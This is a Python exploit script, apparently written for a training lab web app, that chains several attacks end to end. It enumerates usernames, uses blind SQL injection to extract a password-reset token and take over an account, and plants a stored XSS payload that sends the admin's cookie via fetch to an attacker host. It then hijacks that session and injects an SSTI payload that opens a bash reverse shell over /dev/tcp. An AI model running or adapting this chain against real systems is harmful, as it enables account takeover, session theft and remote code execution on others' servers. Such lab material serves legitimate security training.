#!/usr/bin/python

'''
Instructions:
1. set USERNAME_LIST_FP
2. Run: nc -lvnp 3333
3. Run: python sqli-sess_hijack-ssti-rce.py
'''

import sys
import requests
import socket

url = 'http://10.25.1.7:80'
USERNAME_LIST_FP = '/home/kali/labs/tudo/username_list.txt' # username list

USER1_PASSWORD = 'password123'
LHOST = '192.168.26.130'
LPORT = '443'
LPORT_RCE_SSTI = '3333'

proxies = {
	'http': '127.0.0.1:8080',
	'https': '127.0.0.1:8080'
}


def enumerate_user(username_list_fp):
	valid_users = []

	with open(username_list_fp) as f:
		for username in f:
			data = {"username":username.strip()}
			r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)
			if 'User exists' in r.text:
				valid_users.append(username.strip())

	return valid_users


def forgot_password(username):
	data = {"username":username}
	r = requests.post(f"{url}/forgotpassword.php", data=data, proxies=proxies, verify=False)
	if 'Email sent!' in r.text:
		return True
	return False



def get_uid_by_sqli(username):
	uid = ''
	for i in range(50):
		injection_string = f"{username}' and (select uid from users where username='{username}')={str(i)};-- "
		data = {"username":injection_string}
		r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)
		if 'User exists' in r.text:
			uid = str(i)
			break
	return uid


def get_reset_token_by_sqli(uid, username):
	print(f"[+] getting reset token for {username}")
	token = ''

	for i in range(1,33):
		for j in range(32,127):
			template_string = f"(select ascii(substring(token,{i},1)) from tokens where uid={uid} limit 1)={j}"
			injection_string = f"{username}' and {template_string}; -- "

			data = {"username":injection_string}
		
			r = requests.post(url=f"{url}/forgotusername.php", data=data, verify=False)

			if 'User exists' in r.text:
				token += chr(j)
				sys.stdout.flush()
				sys.stdout.write(chr(j))
				sys.stdout.flush()
				break
	print('\n')
	return token
	

def reset_password(reset_token, password):
	data = {
		'token':reset_token,
		'password1':password,
		'password2':password
	}

	params = {"token":reset_token}
	r = requests.get(f"{url}/resetpassword.php", params=params, proxies=proxies, verify=False)
	r = requests.post(f"{url}/resetpassword.php", data=data, proxies=proxies, verify=False)
	if 'Password changed' in r.text:
		return True
	return False


def login(s, username, password):
	s.get(f"{url}/login.php")

	data = {'username':username,'password':password}
	r = s.post(f"{url}/login.php", data=data)
	if username in r.text:
		return True	


def update_profile_desc(s, payload):
	data = {"description":payload}
	r = s.post(f"{url}/profile.php", data=data)
	if "Success" in r.text:
		return True
	return False


def get_admin_cookie(lhost, lport):
	print(f"[+] setting up listener on port {lport}...")
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind((lhost, int(lport)))
		s.listen()
		
		conn, addr = s.accept()
		data = conn.recv(4096)
		query_string = data.split(b" HTTP")[0][5:].decode()
		admin_cookie = query_string.split('=')[-1]
	s.close()
	return admin_cookie


def get_admin_session(admin_cookie):
	s = requests.Session()
	s.proxies.update(proxies)
	s.verify = False
	s.cookies.set("PHPSESSID", admin_cookie)
	return s


def get_ssti_motd(lhost, lport):
	return f"{{php}}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");{{/php}}"


def update_motd(s, payload):
	data = {"message":payload}
	r = s.post(f"{url}/admin/update_motd.php", data=data)


def get_index_page(s):
	s.get(f"{url}")

def main():
	valid_users = enumerate_user(USERNAME_LIST_FP)
	for username in valid_users:
		print(f"[+] username found: {username}")

	username = valid_users[1] # user1 - low privilege

	# get user1 password
	print(f"[+] getting uid of username: {username}")
	uid = get_uid_by_sqli(username)
	print(f"[+] uid of username: {uid}\n")

	# forgot password to generate reset token in DB
	print(f"[+] sending forgot password for {username}")
	if(forgot_password(username)):
		print(f"[+] forgot password for {username} - success")
	else:
		print(f"[-] forgot password for {username} - fail, user doesn't exist")


	# SQLi - exfiltrate reset token
	print(f"[+] getting reset token for username: {username}")
	reset_token = get_reset_token_by_sqli(uid, username)
	print(f"[+] reset token for username: {reset_token}")

	# reset password via token
	print(f"[+] resetting forgot password for {username}")
	if(reset_password(reset_token, USER1_PASSWORD)):
		print(f"[+] reset password for {username} - success")
	else:
		print(f"[-] reset password for {username} - fail, token is invalid")

	# login
	s = requests.Session()
	s.proxies.update(proxies)
	s.verify = False

	# estab pre-auth sess
	r = s.get(f"{url}")

	# login with user1
	print(f"[+] logging in with {username}:{USER1_PASSWORD}")
	if (login(s, username, USER1_PASSWORD)):
		print(f"[+] login for {username} - success\n")
	else:
		print(f"[-] login for {username} failed\n")

	# Stored XSS - profile description for session hijacking
	payload = f"<script>fetch('http://{LHOST}:{LPORT}/?c='+document.cookie);</script>"
	print("[+] stealing admin's cookie via Stored XSS")
	if (update_profile_desc(s, payload)):
		print(f"[+] updated {username} profile description to store: \n\t{payload}")
	else:
		print(f"[-] updated {username} profile description to store XSS payload - fail")

	# get admin cookie via socket listener
	admin_cookie = get_admin_cookie(LHOST, LPORT)
	# get admin session
	admin_s = get_admin_session(admin_cookie)
	print(f"[+] got admin session with Cookie: PHPSESSID={admin_cookie}\n")


	# RCE - SSTI -> run: nc -lvnp 3333
	ssti_payload = get_ssti_motd(LHOST, LPORT_RCE_SSTI)
	print(f"[+] SSTI payload: {ssti_payload}")
	update_motd(admin_s, ssti_payload)
	print(f"[+] updated MOTD for SSTI, go to {url}/index.php for reverse conn at {LHOST}/{LPORT_RCE_SSTI}\n")
	print(f"[+] triggering SSTI...")
	get_index_page(admin_s)




if __name__ == "__main__":
	main()
